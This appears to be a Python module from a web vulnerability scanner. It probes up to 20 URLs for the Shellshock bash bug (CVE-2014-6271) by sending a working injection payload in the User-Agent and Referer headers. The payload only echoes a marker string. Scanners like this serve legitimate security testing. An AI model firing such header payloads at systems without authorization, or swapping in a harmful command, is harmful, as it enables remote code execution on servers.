import asyncio
from modules.core import console

# Payload attempts to echo a unique string "vulnerable"
SHELLSHOCK_PAYLOAD = "() { :;}; echo; echo 'vulnerable'"

async def check_shellshock(session, url):
    headers = {
        "User-Agent": SHELLSHOCK_PAYLOAD,
        "Referer": SHELLSHOCK_PAYLOAD
    }
    try:
        async with session.get(url, headers=headers, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "vulnerable" in text:
                 # Ensure it's not just reflection of the user agent in the page
                 # Shellshock usually prints it before headers or as body content from the command execution.
                 # If the page just reflects UA, this is a false positive.
                 # Advanced check: inject `sleep 5` and measure time.
                 # For now, simple echo check.
                 return {
                     "url": url,
                     "payload": SHELLSHOCK_PAYLOAD,
                     "status": "Vulnerable (Echoed)"
                 }
    except Exception:
        pass
    return None

async def scan_shellshock(session, urls):
    """
    Scan for Shellshock (Bash Bug).
    """
    console.print(f"\n[bold cyan]--- Shellshock Scanner (CVE-2014-6271) ---[/bold cyan]")
    
    # Normally targets CGI scripts. We scan first 20 pages found.
    targets = urls[:20]
    if not targets:
         console.print("[yellow][!] No URLs to scan.[/yellow]")
         return []
         
    console.print(f"[dim]Testing {len(targets)} URLs for Shellshock...[/dim]")
    
    tasks = [check_shellshock(session, url) for url in targets]
    results = await asyncio.gather(*tasks)
    
    vulns = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] SHELLSHOCK VULNERABILITY FOUND![/bold red]")
             console.print(f"      URL: {res['url']}")
             vulns.append(res)
             
    if not vulns:
        console.print("[green][+] No Shellshock vulnerabilities detected.[/green]")
        
    return vulns
